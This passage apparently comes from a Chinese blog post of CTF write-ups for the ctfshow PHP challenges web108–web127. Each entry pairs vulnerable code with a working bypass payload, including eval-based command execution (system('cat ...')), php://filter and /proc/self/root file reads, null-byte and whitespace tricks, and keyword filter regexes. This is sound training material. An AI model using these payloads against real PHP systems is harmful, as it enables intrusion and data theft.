class="line">  </span><br><span class="line">s532378020a</span><br><span class="line"><span class="number">0e220463095855511507588041205815</span></span><br><span class="line">  </span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">  </span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">  </span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">  </span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line">  </span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">  </span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line">  </span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line">  </span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line">  </span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line">  </span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="number">0x02</span> <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>())</span><br><span class="line">  </span><br><span class="line"><span class="number">0x03</span> <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(str).<span class="string">&quot;SALT&quot;</span>)</span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">0e774261293712168181959463563504</span></span><br></pre></td></tr></table></figure>


<h2 id="web108-00截断"><a href="#web108-00截断" class="headerlink" title="web108(%00截断)"></a>web108(%00截断)</h2><h3 id="ereg-函数"><a href="#ereg-函数" class="headerlink" title="ereg()函数"></a>ereg()函数</h3><p>ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。</p>
<p>可选的输入参数规则包含一个数组的所有匹配表达式,他们被正则表达式的括号分组。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ereg</span> (<span class="string">&quot;^[a-zA-Z]+$&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>])===<span class="literal">FALSE</span>)  &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//只有36d的人才能看到flag</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">strrev</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))==<span class="number">0x36d</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>这题限制c只能是<strong>一个或多个大小写字母</strong>。</p>
<h3 id="strrev-函数"><a href="#strrev-函数" class="headerlink" title="strrev()函数"></a>strrev()函数</h3><p>strrev() 函数反转字符串。</p>
<h3 id="intval-函数"><a href="#intval-函数" class="headerlink" title="intval()函数"></a>intval()函数</h3><p>intval() 函数用于获取变量的整数值。</p>
<p>这题同时又要求c反转后与0x36d相等，同时满足这两点，需要用到%00截断。</p>
<p>最终payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=a%<span class="number">00778</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web109-Exception-异常处理类"><a href="#web109-Exception-异常处理类" class="headerlink" title="web109(Exception 异常处理类)"></a>web109(<a href="http://c.biancheng.net/view/6253.html">Exception 异常处理类</a>)</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>第九行新增一个类，那肯定是内置类</p>
<p>v2哪里又出现一个括号，说明是把它当作一个函数来调用，使用一个有回显的内置类给V1，V2RCE即可。</p>
<p>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?v1=<span class="built_in">Exception</span>&amp;v2=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat fl36dg.txt&#x27;</span>)</span><br><span class="line">?v1=ReflectionClass&amp;v2=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat fl36dg.txt&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p><strong>payload:</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?v1=<span class="built_in">FilesystemIterator</span>&amp;v2=getcwd</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>构造后回显一个<code>fl36dga.txt</code>，访问得到flag</p>
<p><strong>原理：</strong></p>
<h3 id="FilesystemIterator"><a href="#FilesystemIterator" class="headerlink" title="FilesystemIterator"></a>FilesystemIterator</h3><p>获取指定目录下的所有文件</p>
<h2 id="getcwd-函数"><a href="#getcwd-函数" class="headerlink" title="getcwd()函数"></a>getcwd()函数</h2><p>获取当前工作目录 返回当前工作目录</p>
<h1 id="web111"><a href="#web111" class="headerlink" title="web111"></a>web111</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params">&amp;<span class="variable">$v1</span>,&amp;<span class="variable">$v2</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;$<span class="subst">$v1</span> = &amp;$<span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$$v1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">getFlag</span>(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>这里给v1和v2赋值，然后v2的值又会赋给v1，覆盖v1原来的值</p>
<h3 id="超全局变量-GLOBALS"><a href="#超全局变量-GLOBALS" class="headerlink" title="超全局变量$GLOBALS"></a>超全局变量$GLOBALS</h3><p>官方说明</p>
<ol>
<li>$GLOBALS — 引用全局作用域中可用的全部变量。</li>
<li>一个包含了全部变量的全局组合数组。变量的名字就是数组的键。</li>
<li>即出现过的全局变量，就可以通过$GLOBALS这个数组取得。</li>
<li>PHP生命周期中，定义在函数体外部的所谓全局变量，函数内部是不能直接获得的。<br>payload: <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?v1=ctfshow&amp;v2=GLOBALS</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="web112"><a href="#web112" class="headerlink" title="web112"></a>web112</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-30 23:47:49</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>直接用filter伪协议读取文件即可:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/resource=flag.php</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h1><p>和web112相比，多了一个限制条件<code>filter</code><br>这里可以用web112给出的姿势</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=compress.zlib:<span class="comment">//flag.php</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>超过20次软连接后就可以绕过is_file</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/p</span><br><span class="line">roc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/pro</span><br><span class="line">c/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/</span><br><span class="line"><span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/se</span><br><span class="line">lf/root/proc/<span class="built_in">self</span>/root/<span class="keyword">var</span>/www/html/flag.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h1><p>这题把compress这些过滤了，但是把filter放出来了。。。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>所以题解和web112一样</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/resource=flag.php</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-01 15:08:19</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$num</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;e&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;+&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$num</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>) <span class="keyword">and</span> <span class="variable">$num</span>!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">trim</span>(<span class="variable">$num</span>)!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">filter</span>(<span class="variable">$num</span>)==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hacker!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!!!&quot;</span>;</span><br><span class="line">&#125; hacker!!!</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="trim函数"><a href="#trim函数" class="headerlink" title="trim函数"></a>trim函数</h3><p>语法 <code>trim(string,charlist)</code>参数</p>
<blockquote>
<p>string —必需。规定要检查的字符串。<br>charlist—可选。规定从字符串中删除哪些字符。如果省略该参数，则移除下列所有字符：<br>“\0” - NULL<br>“\t” - 制表符<br>“\n” - 换行<br>“\x0B” - 垂直制表符<br>“\r” - 回车<br>“ “ - 空格</p>
</blockquote>
<p>trim+is_numeric的测试:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt;=<span class="number">128</span> ; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="variable">$x</span>=<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>).<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">   <span class="keyword">if</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$x</span>)!==<span class="string">&#x27;1&#x27;</span> &amp;&amp;  <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可利用的只剩<code>%0c</code>了<br>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">num=%<span class="number">0</span>c36</span><br></pre></td></tr></table></figure>

<h1 id="web123"><a href="#web123" class="headerlink" title="web123"></a>web123</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?/&quot;</span>, <span class="variable">$c</span>)&amp;&amp;<span class="variable">$c</span>&lt;=<span class="number">18</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);  </span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>一个难点是这里</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>PHP变量名由数字字母下划线组成，是没有.的<br>这里从大佬的文章了解到，GET或POST方式传进去的变量名,会自动将空格 + . [转换为_。<br>有一种特殊情况，特殊字符[GET或POST方式传参时,变量名中的[也会被替换为_,但其后的字符就不会被替换了<br>如 CTF[SHOW.COM&#x3D;&gt;CTF_SHOW.COM<br><strong>payload</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=<span class="keyword">echo</span> <span class="variable">$flag</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>很明显这个解是非预期的，也不是通过正常步骤得到flag的<br>出题人的<strong>预期解</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">get: a=<span class="number">1</span>+fl0g=flag_give_me</span><br><span class="line">post: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=<span class="title function_ invoke__">parse_str</span>(<span class="variable">$a</span>[<span class="number">1</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="web125"><a href="#web125" class="headerlink" title="web125"></a>web125</h1><p>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GET:?<span class="number">1</span>=flag.php </span><br><span class="line">POST:CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="number">1</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="web126"><a href="#web126" class="headerlink" title="web126"></a>web126</h2><p>这题的姿势同web124的预期解，即</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">get: a=<span class="number">1</span>+fl0g=flag_give_me</span><br><span class="line">post: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=<span class="title function_ invoke__">parse_str</span>(<span class="variable">$a</span>[<span class="number">1</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="web127"><a href="#web127" class="headerlink" title="web127"></a>web127</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$ctf_show</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>);</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//特殊字符检测</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\//&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span 